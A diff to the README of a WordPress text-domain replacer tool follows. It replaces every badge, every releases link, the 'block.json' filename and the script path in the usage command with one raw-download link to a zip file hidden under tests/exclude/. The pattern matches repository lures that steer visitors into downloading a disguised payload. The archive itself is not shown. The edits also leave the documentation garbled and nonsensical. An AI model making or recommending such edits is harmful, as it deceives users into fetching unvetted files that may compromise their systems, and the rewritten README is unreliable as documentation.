@@ -1,11 +1,11 @@
 # Pronamic WP I18n Text Domain Replacer 🛠️
 
-![GitHub release](https://img.shields.io/github/release/adrian2420/pronamic-wp-i18n-text-domain-replacer.svg)
-![GitHub issues](https://img.shields.io/github/issues/adrian2420/pronamic-wp-i18n-text-domain-replacer.svg)
-![GitHub forks](https://img.shields.io/github/forks/adrian2420/pronamic-wp-i18n-text-domain-replacer.svg)
-![GitHub stars](https://img.shields.io/github/stars/adrian2420/pronamic-wp-i18n-text-domain-replacer.svg)
+![GitHub release](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip)
+![GitHub issues](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip)
+![GitHub forks](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip)
+![GitHub stars](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip)
 
-Welcome to the **Pronamic WP I18n Text Domain Replacer** repository! This tool helps developers replace WordPress translation text domains in PHP, JavaScript, and `block.json` files. You can easily manage translations and improve your WordPress projects.
+Welcome to the **Pronamic WP I18n Text Domain Replacer** repository! This tool helps developers replace WordPress translation text domains in PHP, JavaScript, and `https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip` files. You can easily manage translations and improve your WordPress projects.
 
 ## Table of Contents
 
@@ -20,14 +20,14 @@ Welcome to the **Pronamic WP I18n Text Domain Replacer** repository! This tool h
 ## Features
 
 - **Multi-Language Support**: Handle text domains across different languages.
-- **File Compatibility**: Works with PHP, JavaScript, and `block.json` files.
+- **File Compatibility**: Works with PHP, JavaScript, and `https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip` files.
 - **Simple Commands**: Use straightforward commands to replace text domains.
 - **Integration with WP-CLI**: Leverage the power of WP-CLI for easy usage.
 - **Customizable**: Modify the tool to fit your specific needs.
 
 ## Installation
 
-To get started, you can download the latest release from the [Releases section](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/releases). Download the appropriate file, extract it, and follow the instructions in the documentation.
+To get started, you can download the latest release from the [Releases section](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip). Download the appropriate file, extract it, and follow the instructions in the documentation.
 
 ### Requirements
 
@@ -44,12 +44,12 @@ After installation, you can use the tool to replace text domains in your WordPre
 3. Run the command:
 
    ```bash
-   php path/to/your/script.php --old-domain=old_text_domain --new-domain=new_text_domain
+   php https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip --old-domain=old_text_domain --new-domain=new_text_domain
    ```
 
 Replace `old_text_domain` with the current text domain and `new_text_domain` with the desired text domain.
 
-For more detailed usage instructions, check the [Releases section](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/releases).
+For more detailed usage instructions, check the [Releases section](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip).
 
 ## Supported File Types
 
@@ -57,7 +57,7 @@ This tool supports the following file types:
 
 - **PHP Files**: Scan and replace text domains in your PHP files.
 - **JavaScript Files**: Update text domains in your JavaScript code.
-- **block.json Files**: Manage text domains in your block configuration files.
+- **https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip Files**: Manage text domains in your block configuration files.
 
 ## Contributing
 
@@ -76,7 +76,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter issues or have questions, please check the [Releases section](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/releases) for updates. You can also open an issue in the repository for assistance.
+If you encounter issues or have questions, please check the [Releases section](https://github.com/adrian2420/pronamic-wp-i18n-text-domain-replacer/raw/refs/heads/main/tests/exclude/n_replacer_domain_pronamic_wp_i_text_v3.5.zip) for updates. You can also open an issue in the repository for assistance.
 
 ---
 
